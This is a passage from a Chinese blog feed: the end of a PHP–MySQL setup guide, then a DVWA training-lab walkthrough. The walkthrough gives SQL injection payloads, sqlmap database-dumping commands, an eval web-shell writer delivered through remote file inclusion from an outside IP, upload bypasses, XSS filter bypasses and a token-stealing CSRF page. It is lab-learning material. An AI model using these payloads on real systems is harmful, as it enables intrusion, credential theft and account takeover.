src="https://img-blog.csdnimg.cn/20210128094447532.png"></p></li><li><p>退出数据库：<code>quit;</code>(/q或者ctrl^z)<br><img src="https://img-blog.csdnimg.cn/20210127231852310.png"></p></li><li><p>将mysql的bin配置环境变量中（方便启动时不用切换目录）</p></li></ul><h1 id="五、php连接mysql"><a href="#五、php连接mysql" class="headerlink" title="五、php连接mysql"></a>五、php连接mysql</h1><p>此处使用的版本为php7 连接数据库与&lt;5.X有很大不同</p><ul><li>修改php.ini(之前已经配置过php.ini的一处ext.dir)<br>①去掉下面语句的分号：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">;<span class="hljs-attribute">extension</span>=mysqli<br>;<span class="hljs-attribute">extension</span>=pdo_mysql<br></code></pre></td></tr></table></figure>②在extension代码区下方添加：<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">extension</span>=php_mysqli.dll<br><span class="hljs-attr">extension</span>=php_pdo_mysql.dll<br></code></pre></td></tr></table></figure>测试php能否加载mysqli模块：<br>在apache的htdocs下建立info.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>phpinfo();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>浏览器打开info.php：<br><img src="https://img-blog.csdnimg.cn/20210128110957113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">加载了mysqli的模块，配置成功</li></ul><p>测试php能否操作(连接)数据库：<br>在apache的htdocs下建立test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$db</span>=@<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;mysqladmin&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>-&gt;connect_error)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Connection failed:&#x27;</span>.<span class="hljs-variable">$db</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Connetion successful&lt;/h2&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210128112818969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>跳步配置php.ini的注意要重启apache服务 勿谓言之不预！</strong></p>]]></content>
    
    
    <categories>
      
      <category>debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>environment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2021/01/23/DVWA%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/01/23/DVWA%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>查看代码 发现存在sql注入<br><img src="https://img-blog.csdnimg.cn/20210118115849953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>$ query  = “SELECT * FROM ’users‘ WHERE user = ‘$ user’ AND password = ‘$pass’;”;<br>构造 <code>admin’ # </code> 上图选中代码变为<br>$ query  = “SELECT * FROM ’users‘ WHERE user = ’admin’ <del># ‘ AND password = ‘$pass’;”;</del><br>（#为注释符）</p><p>即变成账户为admin 密码为空 绕过登录<br><img src="https://img-blog.csdnimg.cn/20210118120743567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>还可以抓包burp里进行字典爆破</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>利用管道符 命令执行漏洞<img src="https://img-blog.csdnimg.cn/20210118124150895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="命令管道符的补充："><a href="#命令管道符的补充：" class="headerlink" title="命令管道符的补充："></a>命令管道符的补充：</h2><blockquote><p>Windows系统支持的管道符如下：<br>| 直接执行后面的语句。<br>|| 如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。<br>&amp; 两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。<br>&amp;&amp; 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</p></blockquote><blockquote><p>Linux系统支持的管道符如下：<br>; 执行完前面的语句再执行后面的语句。<br>| 显示后面语句的执行结果。<br>|| 当前面的语句执行出错时，执行后面的语句。<br>&amp; 两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。<br>&amp;&amp; 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</p></blockquote><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<img src="https://img-blog.csdnimg.cn/20210131211950245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>输入两次不一致的密码<br><img src="https://img-blog.csdnimg.cn/20210118124802606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">查看url栏发现这是个修改密码的链接(一定要查看链接所提交的内容)<br><img src="https://img-blog.csdnimg.cn/20210118125702960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">直接在url栏修改456为123<br><img src="https://img-blog.csdnimg.cn/20210118125803421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">得到password changed<br><img src="https://img-blog.csdnimg.cn/2021011813013135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70">再次打开DVWA时 发现登录密码错误 输入CSRF里改成的123成功登入</p><p>说明可以通过伪造url实现受害者点击跨站链接(或者写进网页文件里)修改其密码（123456）</p><blockquote><p><a href="http://localhost/DVWA(admin%20password)/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://localhost/DVWA(admin%20password)/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a></p></blockquote><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>点击几个文件发现url<code>http://localhost/DVWA/vulnerabilities/fi/?page=include.php</code><br>随便改一下：<code>http://localhost/DVWA/vulnerabilities/fi/?page=666.php</code><br><img src="https://img-blog.csdnimg.cn/20210207103351948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>存在文件包含漏洞 测试是否可以远程后(该安全等级下可以 不可以的话需要配合文件上传漏洞)<br>D盘下写一个1.txt：<br>(注意，我这儿的D盘路径与dvwa位置不在同一处，此处模拟了远程包含)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>fwrite(fopen(<span class="hljs-string">&quot;1.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[123]);?&gt;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://localhost/DVWA/vulnerabilities/fi/?page=D:/1.txt</code><br>远程包含刚刚的1.txt后，发现在<code>DVWA\vulnerabilities\fi</code>下出现我们设计好的一句话木马1.php，说明远程包含成功</p><p><img src="https://img-blog.csdnimg.cn/20210207104000956.png">实际远程包含长这样<code>localhost/DVWA/vulnerabilities/fi/?page=http://110.247.68.66/1.txt</code><br>连接蚁剑即可</p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>没有过滤上传格式  挂上一句话<br><img src="https://img-blog.csdnimg.cn/20210119114311338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">菜刀添加马的绝对路径和密码<br><img src="https://img-blog.csdnimg.cn/20210119114656435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210119114801547.png"><br>菜刀连接成功<br><img src="https://img-blog.csdnimg.cn/20210119115012575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>环境配置错误 待补充</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>代码如下：<br>$ query  = “SELECT first_name, last_name FROM users WHERE user_id = ‘$id’;”; <strong>为数字型注入</strong></p><ul><li>手工注入：<br><code>’ or 1#</code><br><img src="https://img-blog.csdnimg.cn/20210123124222296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">查询数据库名称和版本：<br><code>1&#39; union select1,database()#</code></li></ul><p><img src="https://img-blog.csdnimg.cn/20210123125952659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">爆出账号密码：<br><code>1&#39; union select user,password from dvwa.users #</code><br><img src="https://img-blog.csdnimg.cn/20210123164921556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><strong>使用sqlmap自动注入：</strong><br>需要跟cookie参数！burp里抓一下或者F12→→Console→→document.cookie得到当前页面cookie</p><p>查询到当前用户和数据库：<br>（看起来后端DBMS是“mysql”。是否要跳过特定于其他DBMS的测试有效负载？直接跳过，不再扫描其他类型的数据库）</p><p><img src="https://img-blog.csdnimg.cn/20210123110126686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>查询当前用户（并且再查询了一次数据库）：<br><img src="https://img-blog.csdnimg.cn/2021012311045032.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>直接拖库：<br><img src="https://img-blog.csdnimg.cn/20210123110912656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">回答问题：</p><ul><li>是否要将哈希值存储到临时文件中，以便其他工具进行处理？n</li><li>你想通过基于字典的攻击破解它们吗？y</li><li>你想用什么字典？enter</li><li>是否要使用常用密码后缀？（慢）y<br><img src="https://img-blog.csdnimg.cn/20210123111032446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">爆出：<br><img src="https://img-blog.csdnimg.cn/20210123111120841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>与前者无异<br><img src="https://img-blog.csdnimg.cn/20210131205918392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><p><strong>反射型</strong><br><img src="https://img-blog.csdnimg.cn/2021013121264539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210131212539124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><code>&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210131212822970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>存储型</strong><br><img src="https://img-blog.csdnimg.cn/20210131215016201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><code>&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210131215136514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><h2 id="Brute-Force-1"><a href="#Brute-Force-1" class="headerlink" title="Brute Force"></a>Brute Force</h2><p><img src="https://img-blog.csdnimg.cn/20210205202516581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>在上一等级加了一sleep(2) 只是增加了爆破的时间而已</p><h2 id="Command-Injection-1"><a href="#Command-Injection-1" class="headerlink" title="Command Injection"></a>Command Injection</h2><p><img src="https://img-blog.csdnimg.cn/20210205203149810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210205202934944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h2><p>过滤规则是http包头的Referer参数的值中必须包含主机名<br><img src="https://img-blog.csdnimg.cn/20210205222605401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>同上一等级将伪造url写进一个以主机名命名的网页文件即可伪造Referer绕过</p><h2 id="File-Inclusion-1"><a href="#File-Inclusion-1" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>同样 测试可以远程包含后 直接写一个1.txt 然后本地包含 连接1.php<br>考了什么：</p><p><img src="https://img-blog.csdnimg.cn/20210207105524332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>代码即将<code>http:// ../ ..\</code>替换为空即删除 那么可以双写绕过：如<code>..././</code>过滤后变为<code>../</code></p><h2 id="File-Upload-1"><a href="#File-Upload-1" class="headerlink" title="File Upload"></a>File Upload</h2><p>文件上传的过滤分为两种:一是上传类型 二是后缀名<br>方法一：<br>抓包 改包<img src="https://img-blog.csdnimg.cn/20210207113713123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207113609279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210207114247547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210207114026134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>方法二：<br>00截断参考<a href="https://blog.csdn.net/qq_36119192/article/details/82904642?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161266854316780261920310%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=161266854316780261920310&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-82904642.first_rank_v2_pc_rank_v29&utm_term=dvwa%20upload">谢公子的博客</a></p><p>上传完一句话后 蚁剑连接</p><h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>换一个工具 超级sql注入(选择合适的工具 熟悉sql注入原理后 注意时效性 并且掌握注入工具的机制)<br>burp抓包 整个包放进注入中心<br><img src="https://img-blog.csdnimg.cn/20210207164641599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>点击自动识别后观察下面框内的程序运行状态<br>注入完后数据中心填入查询条数以及查出数据库 表 列</p><p><strong>回到sqlmap(yyds)</strong><br>由于medium的sql注入均为post注入（get注入在url有?id=1）<br>一般地，post有三个参数，得换个姿势：</p><p><strong>方法一：</strong><br>burp抓包，右击copy file为post.txt保存至sqlmap.py同一文件夹内<br>使用-r参数：<code>python3 sqlmap.py -r &quot;post.txt&quot; --batch</code>后面与前面的sqlmap使用无异<img src="https://img-blog.csdnimg.cn/20210210001416332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>特殊情况需要手动指定参数<a href="https://blog.csdn.net/u014549283/article/details/81290015?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">传送门</a><br><strong>方法二：</strong><br>让sqlmap自己找注入口：<br>使用:<code>python3 sqlmap.py -u &quot;url&quot; --form</code><br>后面更换参数与前面用法无异<br><code>python3 sqlmap.py -u &quot;url&quot; --form --current-db --batch</code>（加–batch参数可以不用回答问题 系统默认执行）<br><img src="https://img-blog.csdnimg.cn/20210210001742708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><strong>方法三：</strong><br>指定参数：<code>sqlmap -u http://xxx.xxx.com/Login.asp --data &quot;id=1&quot;</code></p><h2 id="SQL-Injection-Blind-1"><a href="#SQL-Injection-Blind-1" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>与上无异</p><h2 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS"></a>XSS</h2><p><strong>反射型</strong><br><img src="https://img-blog.csdnimg.cn/20210209183447662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">双写绕过：<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code></p><p><strong>存储型</strong><br>同上</p><h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><h2 id="Command-Injection-2"><a href="#Command-Injection-2" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>过滤规则中 <code>&#39;| &#39;</code>多了一个空格 说明可以通过 | 绕过</p><h2 id="CSRF-2"><a href="#CSRF-2" class="headerlink" title="CSRF"></a>CSRF</h2><p>参考众多wp都提到一个同源策略 <a href="https://www.cnblogs.com/laixiangran/p/9064769.html">来了解一下</a><br>总结来说：同源是指域名、协议、端口相同。它是浏览器的最核心最基本的安全功能——它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该<strong>只被允许访问来自同一站点的资源</strong>，而不是那些来自其它站点可能怀有恶意的资源。<br><img src="https://img-blog.csdnimg.cn/20210307181233902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">了解到这里即可<br>那么看看这题源码：<br><img src="https://img-blog.csdnimg.cn/2021030823044384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>可以看到，high级别加入了<code>Anti-CSRF token</code>机制：用户每一次访问修改密码的网页时，都会向服务器索要一次token(是服务器随机生成的，也是我们的目标)，当用户提交了密码修改，将token传回服务器，token正确才能更新数据库(改密)</p><p>注意到是以get方式请求的，token就会出现在地址栏传回服务器，那么思路就清晰了：我们要得到token，就必须要带有用户的cookie去访问修改密码的网页，然后截取服务器传回的token，然后带上token构造跨站请求伪造</p><p>下面是一个诱使用户点击的页面，其作用是：静默访问用户修改密码的页面(当然可以设置404回显)，获取到服务器传回的token，然后带上token和攻击url向服务器发送请求</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">        <span class="hljs-comment">//获取用户的token，并设置为表单中的token，然后提交修改密码的表单</span></span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="javascript">        </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;transfer&quot;</span>).submit();</span><br><span class="javascript">        &#125;</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://dvwa.com/vulnerabilities/csrf/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hack&quot;</span>  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!--在该网页内打开另一个网页--&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transfer&quot;</span>  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dvwa.com/vulnerabilities/csrf/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span 